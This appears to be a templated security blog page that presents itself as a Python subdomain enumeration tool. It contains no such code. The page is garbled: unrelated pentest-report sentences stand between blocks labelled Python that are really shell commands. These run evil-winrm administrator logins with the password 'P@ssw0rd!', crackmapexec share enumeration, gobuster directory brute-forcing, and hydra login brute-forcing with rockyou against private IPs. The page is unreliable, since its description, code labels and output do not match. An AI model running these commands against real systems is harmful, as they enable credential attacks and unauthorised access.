---
TitleSEO: "Subdomain Enumeration Tool in Python | ZureFX"
TitlePost: "Subdomain Enumeration Tool — Python"
Author: "ZureFX"
Description: "A Python script for subdomain enumeration tool. Built for security research and automation."
Keywords: "tool, script, go, scanner, c, python"
URL: "https://zurefx.github.io/scripting/script-subdomain-enumeration-tool-613.html"
URL_IMAGES: ""
Date: "2026-03-04"
Tags: "Tool, Script, Go, Scanner, C, Python"
Section: "scripting"
Lang: "en"
main_img: "script-subdomain-enumeration-tool-613"
Permalink: "/scripting/script-subdomain-enumeration-tool-613.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `sharphound`
- `ligolo-ng`
- `wmiexec`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

```python
evil-winrm -i 10.57.150.162 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```python
evil-winrm -i 10.16.2.34 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.114.86.174/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.95.240.144 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.36.83.89 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.12.83.25 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.32.197.16 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.77.161.203 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.12.97 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 9.92s
```
